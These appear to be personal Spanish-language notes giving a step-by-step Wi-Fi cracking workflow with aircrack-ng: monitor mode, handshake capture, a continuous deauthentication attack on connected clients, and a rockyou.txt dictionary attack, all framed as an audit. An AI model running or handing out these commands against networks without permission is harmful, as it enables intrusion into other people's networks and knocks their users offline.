Habilitar el usuario root
    sudo su

actualización de los paquetes en los repositorios del sistema
    apt-get update

Corremos el upgrade de los paquetes en el sistema
    apt-get update


Herramienta para auditar redes
sudo apt install aircrack-ng

aircrack.ng 
[Obtener un diccionario de claves rockyou.txt es de buena calidad](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&ved=2ahUKEwiRsJD3-riKAxWhp5UCHVbWOOMQFnoECAoQAQ&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd)

Poder conocer valores de red
ifconfig

Obtenemos el nombre de red y con el siguiente comando ponemos nuestra red en modo monitor
airmon-ng start nombre_red

Obtener el nombre de todas las redes disponibles
airodump-ng nombre_redmon

Una vez obtenida el nombre de red a auditar, copiamos BSSID y el numero de canal que ocupa
airodump-ng -c numero_canal --bssid clave-BSSID -w nombre_auditoria nombre_redmon

Obtenemos clave-BSSID de la señal y de una estacion que este ocupandola
aireplay-ng -0 9 -a clave-BSSID -c clave-BSSID_station nombre_redmon


------------------------------------------------------------------------------------------------


# Paso 1: Obtener el diccionario rockyou.txt (se asume que se descarga manualmente y se mueve)
# El texto indica buscar "Rocky Descargar" en Google y obtenerlo.
# Luego, se recomienda moverlo a un directorio específico para la auditoría.

# Ejemplo de movimientos (ajustar rutas según tu sistema)
mv ~/Downloads/rockyou.txt ~/Desktop/wifi_pentest/

# Paso 2: Instalación de Aircrack-NG
sudo apt install aircrack-ng

# Paso 3: Poner la tarjeta WiFi en modo monitor
# Primero, identifica el nombre de tu interfaz de red. Busca una interfaz que sea tu Wi-Fi (ej: wlan0, wlp2s0)
ifconfig 

# Reemplaza 'nombre_de_tu_interfaz' con el nombre que obtuviste de 'ifconfig' (ej: wlan0)
sudo airmon-ng start nombre_de_tu_interfaz

# Verifica que esté en modo monitor (el nombre de la interfaz debería terminar en 'mon', ej: wlan0mon)
ifconfig

# Paso 4: Enumerar redes WiFi al alcance
# Reemplaza 'nombre_de_tu_interfazmon' con el nombre de tu interfaz en modo monitor (ej: wlan0mon)
sudo airodump-ng nombre_de_tu_interfazmon

# Paso 5: Capturar el handshake de la red objetivo
# Necesitas el BSSID y el Canal de la red que deseas auditar.
# Estos datos los obtuviste del comando anterior (airodump-ng).

# Reemplaza 'CANAL_RED_OBJETIVO' con el canal de la red (ej: 12)
# Reemplaza 'BSSID_RED_OBJETIVO' con el BSSID de la red (ej: 00:11:22:33:44:55)
# Reemplaza 'nombre_de_tu_interfazmon' con el nombre de tu interfaz en modo monitor
# 'auditoria' es el prefijo para los archivos donde se guardará el tráfico
sudo airodump-ng --channel CANAL_RED_OBJETIVO --bssid BSSID_RED_OBJETIVO -w auditoria nombre_de_tu_interfazmon

# En una nueva terminal, para forzar el handshake (ataque de deautenticación)
# Reemplaza 'BSSID_RED_OBJETIVO' con el BSSID de la red
# Reemplaza 'ESTACION_CLIENTE' con la MAC del cliente conectado a la red (aparece en la primera terminal con airodump-ng)
# Reemplaza 'nombre_de_tu_interfazmon' con el nombre de tu interfaz en modo monitor
sudo aireplay-ng --deauth 0 -a BSSID_RED_OBJETIVO -c ESTACION_CLIENTE nombre_de_tu_interfazmon

# Paso 6: Realizar el ataque de diccionario para obtener la contraseña
# Asegúrate de estar en el directorio donde se guardó el archivo .cap (ej: auditoria-01.cap)
# Reemplaza 'BSSID_RED_OBJETIVO' con el BSSID de la red
# Reemplaza 'nombre_del_archivo.cap' con el nombre del archivo .cap (ej: auditoria-01.cap)
# Asegúrate de que 'rockyou.txt' esté en el mismo directorio o proporciona la ruta completa
sudo aircrack-ng --bssid BSSID_RED_OBJETIVO -w rockyou.txt nombre_del_archivo.cap

# Paso 7: Desactivar el modo monitor y restablecer la interfaz de red
# Reemplaza 'nombre_de_tu_interfazmon' con el nombre de tu interfaz en modo monitor
sudo airmon-ng stop nombre_de_tu_interfazmon

# Verifica que el modo monitor se haya desactivado
ifconfig